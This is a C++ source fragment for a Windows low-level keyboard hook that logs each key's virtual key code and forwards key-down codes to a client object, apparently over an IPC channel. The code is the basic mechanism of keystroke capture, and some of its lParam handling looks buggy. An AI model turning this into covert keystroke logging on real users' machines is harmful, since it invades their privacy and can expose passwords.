#include "Memory.h"
#include <string>
#include <io.h>
#include <fcntl.h>
#include <thread>
#include "Windows.h"

LRESULT CALLBACK keyHandler(int nCode, WPARAM wParam, LPARAM lParam) {
	std::cout << "Hello!" << std::endl;

	const int TRANSITION_STATE_BIT = (0x1 << 31);
	int bits = (int)LOWORD(lParam);
	
	//bool pressed = (((KBDLLHOOKSTRUCT *)lParam)->flags & LLKHF_EXTENDED == 0)
	//	&& ((((KBDLLHOOKSTRUCT *)lParam)->flags & LLKHF_UP == 0));
	std::cout << "VKCODE: " << ((KBDLLHOOKSTRUCT *)lParam)->vkCode << std::endl;
	std::cout << "FLAGS: " << ((KBDLLHOOKSTRUCT *)lParam)->flags << std::endl;
	bool pressed = (((KBDLLHOOKSTRUCT *)lParam)->flags & LLKHF_EXTENDED) == 0
		&& (((KBDLLHOOKSTRUCT *)lParam)->flags & LLKHF_UP) == 0;
	// Checks whether params contain action about keystroke
	switch (wParam) {
	case WM_KEYDOWN:
	{
		if ((lParam & (1 << 30)) == 0) {
			DWORD keyCode = (((KBDLLHOOKSTRUCT *)lParam)->vkCode);
			std::string stringKeyCode = std::to_string(keyCode);
			pClient->SetData(stringKeyCode);
			pClient->SetEvent(AU_IOWRITE);
		}
		break;
	}
	case WM_SYSKEYDOWN:
		break;
	case WM_KEYUP:
		break;
	case WM_SYSKEYUP:
		break;
	}

	return CallNextHookEx(hookHandle, nCode, wParam, lParam);
}
